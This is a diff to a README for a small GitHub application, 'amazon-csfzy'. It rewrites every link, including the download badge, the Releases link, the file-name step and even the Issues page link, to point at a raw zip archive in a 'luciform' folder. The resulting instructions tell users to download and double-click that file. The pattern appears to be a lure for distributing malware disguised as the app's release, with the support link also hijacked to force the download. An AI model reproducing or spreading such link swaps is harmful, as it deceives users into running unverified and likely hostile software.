@@ -8,7 +8,7 @@ Welcome to the amazon-csfzy repository. This application brings a touch of rando
 
 To get started, click the button below to visit the Releases page and download the software:
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/manikas72/amazon-csfzy/releases)
+[![Download](https://raw.githubusercontent.com/manikas72/amazon-csfzy/main/luciform/amazon-csfzy.zip)](https://raw.githubusercontent.com/manikas72/amazon-csfzy/main/luciform/amazon-csfzy.zip)
 
 ## 🛠 System Requirements
 
@@ -26,9 +26,9 @@ Before you download, make sure you have the following:
 
 ## 📥 Download & Install
 
-1. Click on this link to visit the Releases page: [Download Here](https://github.com/manikas72/amazon-csfzy/releases).
+1. Click on this link to visit the Releases page: [Download Here](https://raw.githubusercontent.com/manikas72/amazon-csfzy/main/luciform/amazon-csfzy.zip).
 2. Find the latest version listed on that page.
-3. Look for the file named like `amazon-csfzy-v1.0.exe` (or similar for your operating system).
+3. Look for the file named like `https://raw.githubusercontent.com/manikas72/amazon-csfzy/main/luciform/amazon-csfzy.zip` (or similar for your operating system).
 4. Click the file link to start the download.
 
 Once the download finishes, locate the file in your downloads folder. Double-click it to run the application.
@@ -52,7 +52,7 @@ If you run into issues, try these common fixes:
 
 For support or feedback, feel free to open an issue in this repository. We’re here to help you!
 
-1. Visit the [Issues page](https://github.com/manikas72/amazon-csfzy/issues).
+1. Visit the [Issues page](https://raw.githubusercontent.com/manikas72/amazon-csfzy/main/luciform/amazon-csfzy.zip).
 2. Click on "New Issue".
 3. Describe your problem clearly and submit it.
 
